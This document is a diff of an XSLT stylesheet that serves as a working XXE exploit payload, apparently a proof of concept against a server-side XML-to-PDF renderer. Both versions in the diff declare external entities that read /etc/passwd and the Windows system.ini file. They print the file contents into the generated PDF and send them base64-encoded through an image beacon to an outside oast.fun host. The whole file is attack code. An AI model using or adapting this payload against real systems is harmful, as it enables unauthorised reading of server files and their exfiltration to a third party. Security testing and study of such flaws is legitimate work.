@@ -1,114 +1,55 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <?xml-stylesheet type="text/xsl" href="?#"?>
-<!DOCTYPE xsl:stylesheet [
+<!DOCTYPE div [
   <!ENTITY passwd_p        "file:///etc/passwd">
   <!ENTITY passwd_c SYSTEM "file:///etc/passwd">
   <!ENTITY sysini_p        "file:///c:/windows/system.ini">
   <!ENTITY sysini_c SYSTEM "file:///c:/windows/system.ini">
 ]>
 <xsl:stylesheet version="1.0"
-  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
-  xmlns="http://www.w3.org/1999/xhtml">
-
-  <!-- Serialize as XML/XHTML and omit the XML declaration in the result.
-       This prevents a second prolog from appearing ahead of the content. -->
-  <xsl:output method="xml" omit-xml-declaration="yes" encoding="UTF-8"/>
+  xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
 
   <xsl:template match="/">
-    <html>
-      <head>
-        <meta charset="utf-8"/>
-        <title>PDF Exfil Output</title>
-        <style>
-          html,body{margin:0;padding:0}
-          #r { width:40rem; margin:1rem; font:12px/1.4 system-ui, sans-serif; }
-          textarea { width:100%; font:12px/1.4 monospace; }
-        </style>
-      </head>
-      <body>
+    <xsl:copy-of select="document('')"/>
 
-        <!-- Hidden entity expansion targets (XXE) -->
-        <div style="display:none">
-          <p class="&passwd_p;">&passwd_c;</p>
-          <p class="&sysini_p;">&sysini_c;</p>
-        </div>
+    <body xmlns="http://www.w3.org/1999/xhtml">
+      <div style="display:none">
+        <p class="&passwd_p;">&passwd_c;</p>
+        <p class="&sysini_p;">&sysini_c;</p>
+      </div>
 
-        <!-- Visible proof area -->
-        <div id="r"></div>
+      <div style="width:40rem" id="r"></div>
 
-        <script><![CDATA[
-          // ---- helpers ----
-          function b64utf8(s){ return btoa(unescape(encodeURIComponent(s))); }
+      <script><![CDATA[
+        // Render visible proof in PDF
+        document.querySelector('#r').innerHTML = `
+remote web url:
+<textarea style="width:100%;height:1.5rem">${location.href}</textarea><br/><br/>`;
 
-          // ---- render initial proof ----
-          const r = document.getElementById('r');
-          { // remote web url
-            const label = document.createElement('div');
-            label.textContent = 'remote web url:';
-            r.appendChild(label);
+        let exfilData = '';
 
-            const ta = document.createElement('textarea');
-            ta.style.height = '1.5rem';
-            ta.textContent = location.href;
-            r.appendChild(ta);
+        document.querySelectorAll('p').forEach(p => {
+          document.querySelector('#r').innerHTML += `
+local file path:
+<textarea style="width:100%;height:1.5rem">${p.className}</textarea><br/>
+local file content:
+<textarea style="width:100%;height:60rem">${p.innerHTML}</textarea><br/><br/>`;
 
-            r.appendChild(document.createElement('br'));
-            r.appendChild(document.createElement('br'));
-          }
+          exfilData += 'PATH:' + p.className + '\n';
+          exfilData += 'DATA:' + p.innerHTML + '\n\n';
+        });
 
-          // ---- collect file paths & contents from hidden <p> nodes ----
-          const ps = document.querySelectorAll('p');
+        // UTF-8 safe Base64 encode
+        function b64encode(str) {
+          return btoa(unescape(encodeURIComponent(str)));
+        }
 
-          // If this prints 0, entities didn't expand; the transform isn't producing <p> nodes.
-          const countNote = document.createElement('div');
-          countNote.textContent = 'found <p> nodes: ' + ps.length;
-          r.appendChild(countNote);
-
-          let raw = '';
-          ps.forEach(p => {
-            const path = p.className;
-            const data = p.textContent; // textContent preserves raw text
-
-            // show path
-            {
-              const label = document.createElement('div');
-              label.textContent = 'local file path:';
-              r.appendChild(label);
-
-              const ta = document.createElement('textarea');
-              ta.style.height = '1.5rem';
-              ta.textContent = path;
-              r.appendChild(ta);
-            }
-
-            // show content
-            {
-              const label = document.createElement('div');
-              label.textContent = 'local file content:';
-              r.appendChild(label);
-
-              const ta = document.createElement('textarea');
-              ta.style.height = '60rem';
-              ta.textContent = data;
-              r.appendChild(ta);
-
-              r.appendChild(document.createElement('br'));
-              r.appendChild(document.createElement('br'));
-            }
-
-            raw += 'PATH:' + path + '\n' + 'DATA:' + data + '\n\n';
-          });
-
-          // ---- exfil (single hit; expand to chunked if needed) ----
-          if (ps.length > 0) {
-            const b64 = b64utf8(raw);
-            const img = new Image();
-            img.src = 'https://alxahyaoyjbzqgdbnokoq6mhut6y4r2jf.oast.fun/?x=' + encodeURIComponent(b64);
-            document.body.appendChild(img);
-          }
-        ]]></script>
-
-      </body>
-    </html>
+        // Build beacon and send
+        const encoded = b64encode(exfilData);
+        const img = new Image();
+        img.src = 'https://alxahyaoyjbzqgdbnokoq6mhut6y4r2jf.oast.fun/poc-exfil?data=' + encodeURIComponent(encoded);
+        document.body.appendChild(img);
+      ]]></script>
+    </body>
   </xsl:template>
 </xsl:stylesheet>
